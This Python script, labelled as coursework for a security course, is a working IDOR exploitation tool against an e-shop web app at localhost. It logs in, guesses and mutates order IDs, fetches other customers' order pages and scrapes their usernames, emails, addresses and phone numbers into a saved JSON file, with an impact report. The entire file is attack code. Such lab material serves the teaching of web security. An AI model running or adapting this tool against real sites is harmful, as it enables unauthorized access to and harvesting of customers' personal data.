#!/usr/bin/env python3
"""
IDOR (Insecure Direct Object Reference) Exploitation Script for E-Shop
Educational Purpose Only - Part of CDS201 Course

This script demonstrates IDOR vulnerabilities in order viewing functionality.
"""

import requests
import sys
import re
import string
import random
from colorama import init, Fore, Style
from bs4 import BeautifulSoup
import json

# Initialize colorama for colored output
init(autoreset=True)

BASE_URL = "http://localhost:8000"


class IDORExploit:
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.session = requests.Session()
        self.found_orders = []
        self.harvested_data = []
        
    def login(self, username, password):
        """Login to get authenticated session"""
        print(f"{Fore.YELLOW}[*] Attempting to login as {username}...")
        
        login_data = {
            'username': username,
            'password': password
        }
        
        response = self.session.post(f"{self.base_url}/login/", data=login_data)
        
        if response.status_code == 302 or 'logout' in response.text.lower():
            print(f"{Fore.GREEN}[+] Successfully logged in!")
            return True
        else:
            print(f"{Fore.RED}[-] Login failed!")
            return False
    
    def get_own_orders(self):
        """Get user's own orders to understand ID pattern"""
        print(f"{Fore.YELLOW}[*] Fetching your orders to analyze ID pattern...")
        
        response = self.session.get(f"{self.base_url}/my-orders/")
        
        if response.status_code != 200:
            print(f"{Fore.RED}[-] Failed to fetch orders")
            return []
        
        # Extract order IDs using regex
        order_pattern = r'ORD-[A-Z0-9]{5}-[A-Z0-9]{5}'
        orders = re.findall(order_pattern, response.text)
        
        if orders:
            print(f"{Fore.GREEN}[+] Found {len(orders)} of your orders:")
            for order in orders[:5]:  # Show first 5
                print(f"    {order}")
            
            if len(orders) > 5:
                print(f"    ... and {len(orders) - 5} more")
                
        return orders
    
    def generate_order_ids(self, count=50):
        """Generate possible order IDs based on pattern"""
        print(f"{Fore.YELLOW}[*] Generating {count} potential order IDs...")
        
        chars = string.ascii_uppercase + string.digits
        order_ids = []
        
        for _ in range(count):
            part1 = ''.join(random.choices(chars, k=5))
            part2 = ''.join(random.choices(chars, k=5))
            order_id = f"ORD-{part1}-{part2}"
            order_ids.append(order_id)
            
        return order_ids
    
    def smart_generate_ids(self, known_id):
        """Generate variations based on known ID"""
        print(f"{Fore.YELLOW}[*] Generating smart variations based on: {known_id}")
        
        if not known_id.startswith('ORD-'):
            return []
            
        parts = known_id.split('-')
        if len(parts) != 3:
            return []
            
        variations = []
        chars = string.ascii_uppercase + string.digits
        
        # Try incrementing last characters
        for i in range(10):
            new_part2 = parts[2][:-1] + chars[i]
            variations.append(f"ORD-{parts[1]}-{new_part2}")
            
        # Try common patterns
        common_parts = ['ADMIN', 'TEST1', 'DEMO1', 'USER1', '12345', 'AAAAA']
        for part in common_parts:
            variations.append(f"ORD-{part}-{parts[2]}")
            variations.append(f"ORD-{parts[1]}-{part}")
            
        return variations
    
    def check_order_access(self, order_id):
        """Check if we can access a specific order"""
        url = f"{self.base_url}/order/{order_id}/"
        
        try:
            response = self.session.get(url)
            
            if response.status_code == 200 and "Order Details" in response.text:
                return True, response.text
            else:
                return False, None
                
        except Exception as e:
            return False, None
    
    def extract_order_data(self, order_id, html):
        """Extract sensitive data from order page"""
        soup = BeautifulSoup(html, 'html.parser')
        
        data = {
            'order_id': order_id,
            'user_info': {},
            'shipping': {},
            'items': [],
            'total': None
        }
        
        # Extract username
        username_match = re.search(r'Username:</strong>\s*([^<]+)', html)
        if username_match:
            data['user_info']['username'] = username_match.group(1).strip()
            
        # Extract email
        email_match = re.search(r'Email:</strong>\s*([^<]+)', html)
        if email_match:
            data['user_info']['email'] = email_match.group(1).strip()
            
        # Extract shipping info
        shipping_fields = ['Name:', 'Address:', 'City:', 'Phone:', 'Postal Code:']
        for field in shipping_fields:
            match = re.search(f'{field}</strong>\\s*([^<]+)', html)
            if match:
                data['shipping'][field.lower().strip(':')] = match.group(1).strip()
                
        # Extract total
        total_match = re.search(r'Total.*?€(\d+\.?\d*)', html)
        if total_match:
            data['total'] = float(total_match.group(1))
            
        return data
    
    def scan_for_idor(self, order_ids):
        """Scan multiple order IDs for IDOR vulnerability"""
        print(f"{Fore.YELLOW}[*] Scanning {len(order_ids)} order IDs for IDOR...")
        
        vulnerable_orders = []
        
        for i, order_id in enumerate(order_ids):
            if i % 10 == 0:
                print(f"{Fore.CYAN}[*] Progress: {i}/{len(order_ids)}")
                
            accessible, html = self.check_order_access(order_id)
            
            if accessible:
                print(f"{Fore.GREEN}[+] IDOR FOUND! Accessible order: {order_id}")
                
                # Extract data
                data = self.extract_order_data(order_id, html)
                vulnerable_orders.append(data)
                
                # Display extracted info
                if data['user_info'].get('username'):
                    print(f"    User: {data['user_info']['username']}")
                if data['user_info'].get('email'):
                    print(f"    Email: {data['user_info']['email']}")
                if data['total']:
                    print(f"    Total: €{data['total']}")
                    
        return vulnerable_orders
    
    def save_harvested_data(self, filename="idor_harvested_data.json"):
        """Save harvested data to file"""
        if self.harvested_data:
            with open(filename, 'w') as f:
                json.dump(self.harvested_data, f, indent=2)
            print(f"{Fore.GREEN}[+] Saved {len(self.harvested_data)} orders to {filename}")
    
    def generate_report(self):
        """Generate a report of findings"""
        print(f"\n{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}IDOR Vulnerability Report")
        print(f"{Fore.CYAN}{'='*60}")
        
        if not self.harvested_data:
            print(f"{Fore.YELLOW}No vulnerable orders found.")
            return
            
        print(f"{Fore.GREEN}[+] Successfully accessed {len(self.harvested_data)} orders")
        
        # Unique users affected
        users = set()
        emails = set()
        total_value = 0
        
        for order in self.harvested_data:
            if order['user_info'].get('username'):
                users.add(order['user_info']['username'])
            if order['user_info'].get('email'):
                emails.add(order['user_info']['email'])
            if order['total']:
                total_value += order['total']
                
        print(f"\n{Fore.YELLOW}Impact Analysis:")
        print(f"  - Unique users compromised: {len(users)}")
        print(f"  - Email addresses exposed: {len(emails)}")
        print(f"  - Total order value exposed: €{total_value:.2f}")
        
        print(f"\n{Fore.YELLOW}Sample Exposed Data:")
        for order in self.harvested_data[:3]:  # Show first 3
            print(f"\n  Order: {order['order_id']}")
            print(f"  User: {order['user_info'].get('username', 'N/A')}")
            print(f"  Email: {order['user_info'].get('email', 'N/A')}")
            if order['shipping'].get('address'):
                print(f"  Address: {order['shipping']['address']}")
    
    def automated_attack(self):
        """Run automated IDOR attack"""
        print(f"{Fore.CYAN}{Style.BRIGHT}=== Automated IDOR Attack ==={Style.RESET_ALL}")
        
        # Get own orders first
        own_orders = self.get_own_orders()
        
        if not own_orders:
            print(f"{Fore.YELLOW}[!] No orders found. Creating random IDs...")
            test_ids = self.generate_order_ids(30)
        else:
            # Generate variations based on known IDs
            test_ids = []
            for order in own_orders[:2]:  # Use first 2 orders
                test_ids.extend(self.smart_generate_ids(order))
            
            # Add some random ones too
            test_ids.extend(self.generate_order_ids(20))
            
        # Remove duplicates
        test_ids = list(set(test_ids))
        
        # Scan for IDOR
        print(f"\n{Fore.YELLOW}[*] Testing {len(test_ids)} order IDs...")
        self.harvested_data = self.scan_for_idor(test_ids)
        
        # Generate report
        self.generate_report()
        
        # Save data
        if self.harvested_data:
            self.save_harvested_data()


def main():
    """Main function to run IDOR exploits"""
    
    print(f"{Fore.CYAN}{Style.BRIGHT}")
    print("=" * 50)
    print("IDOR Exploitation Tool - E-Shop Application")
    print("Educational Purpose Only - CDS201 Course")
    print("=" * 50)
    print(f"{Style.RESET_ALL}")
    
    if len(sys.argv) > 1:
        base_url = sys.argv[1]
    else:
        base_url = BASE_URL
    
    exploit = IDORExploit(base_url)
    
    # First, we need to login
    print(f"{Fore.YELLOW}Please provide login credentials:")
    username = input("Username: ")
    password = input("Password: ")
    
    if not exploit.login(username, password):
        print(f"{Fore.RED}[-] Cannot proceed without valid login")
        return
    
    while True:
        print(f"\n{Fore.CYAN}Select an option:")
        print("1. Run automated IDOR scan")
        print("2. Get your orders (analyze pattern)")
        print("3. Test specific order ID")
        print("4. Generate order IDs")
        print("5. Scan custom order list")
        print("6. Generate report")
        print("0. Exit")
        
        try:
            choice = input(f"{Fore.YELLOW}Enter choice: {Style.RESET_ALL}")
            
            if choice == "1":
                exploit.automated_attack()
            elif choice == "2":
                orders = exploit.get_own_orders()
                if orders:
                    print(f"{Fore.GREEN}[+] Your order IDs can be used to generate variations")
            elif choice == "3":
                order_id = input("Enter order ID to test: ")
                accessible, html = exploit.check_order_access(order_id)
                if accessible:
                    print(f"{Fore.GREEN}[+] Order {order_id} is accessible!")
                    data = exploit.extract_order_data(order_id, html)
                    print(json.dumps(data, indent=2))
                else:
                    print(f"{Fore.RED}[-] Cannot access order {order_id}")
            elif choice == "4":
                count = int(input("How many IDs to generate? "))
                ids = exploit.generate_order_ids(count)
                print(f"{Fore.GREEN}[+] Generated {len(ids)} order IDs")
                print("First 10:", ids[:10])
            elif choice == "5":
                ids_input = input("Enter order IDs (comma-separated): ")
                ids = [id.strip() for id in ids_input.split(',')]
                exploit.harvested_data = exploit.scan_for_idor(ids)
            elif choice == "6":
                exploit.generate_report()
            elif choice == "0":
                print(f"{Fore.GREEN}[+] Exiting...")
                break
            else:
                print(f"{Fore.RED}[-] Invalid choice!")
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Interrupted by user")
            break
        except Exception as e:
            print(f"{Fore.RED}[-] Error: {e}")


if __name__ == "__main__":
    main()